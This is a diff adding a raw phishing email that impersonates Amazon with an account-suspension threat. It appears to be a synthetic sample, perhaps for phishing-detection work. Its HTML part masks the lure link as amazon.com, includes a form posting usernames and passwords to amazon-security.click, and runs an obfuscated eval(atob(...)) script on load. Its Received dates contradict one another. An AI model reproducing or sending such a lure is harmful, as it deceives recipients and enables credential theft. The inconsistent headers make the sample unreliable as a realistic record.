@@ -1,0 +1,35 @@
+From: notice@amazon-security.click
+To: victim30@example.com
+Subject: Your account has been suspended - immediate action required
+Date: Tue, 18 Mar 2002 07:12:00 -0500
+Message-ID: <phish-210-e6550174-d252-4878-8bf9-248a7a643df9@amazon-security.click>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 05 Mar 2002 17:42:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 01 Mar 2002 18:27:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 06 Mar 2002 02:07:00 -0500
+Received: from relay3 (relay3.example.net [192.0.2.103]) by mx3.example.com; Tue, 18 Mar 2002 11:24:00 -0500
+Received: from relay4 (relay4.example.net [192.0.2.104]) by mx4.example.com; Tue, 11 Mar 2002 21:55:00 -0500
+Received: from relay5 (relay5.example.net [192.0.2.105]) by mx5.example.com; Tue, 05 Mar 2002 08:03:00 -0500
+Received: from relay6 (relay6.example.net [192.0.2.106]) by mx6.example.com; Tue, 10 Mar 2002 13:03:00 -0500
+Received: from relay7 (relay7.example.net [192.0.2.107]) by mx7.example.com; Tue, 12 Mar 2002 00:18:00 -0500
+Return-Path: <bounce@mail-49291843.top>
+Reply-To: recovery0@gmail.com
+Authentication-Results: mx.example.com; spf=fail smtp.mailfrom=mail-49291843.top; dkim=fail header.d=amazon-security.click; dmarc=fail header.from=amazon-security.click
+Received-SPF: fail (mx.example.com: domain of notice@amazon-security.click does not designate 203.0.113.10 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=amazon-security.click; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="bnd-p-210-abea4bc0"
+
+--bnd-p-210-abea4bc0
+Content-Type: text/plain; charset="UTF-8"
+
+Dear customer,
+
+We detected unusual activity on your account. You must verify your account immediately or it will be suspended. Click here to sign in and confirm your identity.
+http://amazon-security.click/login
+
+Reference: P81D332
+--bnd-p-210-abea4bc0
+Content-Type: text/html; charset="UTF-8"
+
+<html><body onload="track()"><p>Dear customer,<br/><br/>We detected unusual activity on your account. You must verify your account immediately or it will be suspended. Click here to sign in and confirm your identity.<br/>http://amazon-security.click/login<br/><br/>Reference: P81D332</p><p><a href="http://amazon-security.click/login">https://www.amazon.com/signin</a></p><form action="http://amazon-security.click/login" method="post"><input type="text" name="user"/><input type="password" name="pass" style="display:none"/><input type="submit" value="Continue"/></form><script>var s="review the notice";eval(atob('qGiGpdKXgULaLYzzeOvIPPXqitsyfzBRIsdOdZOIuowT+gBW+4C3F0EjMTQ9D98D/uzOWHyYtHSjSwieeCRbGpVjZfLZDjVlAgUSBD6u/D19yhJoHnvzeufP3BG1oynVRbmwDJYv7Qdx7ZA9oSzvBMqORsJdqFBNVGw+QxnEnsjd7w5LNM/L4SSCkGR9Ug52IgwEtZQoWrzTtIYlpnJrMQ=='));</script></body></html>
+--bnd-p-210-abea4bc0--
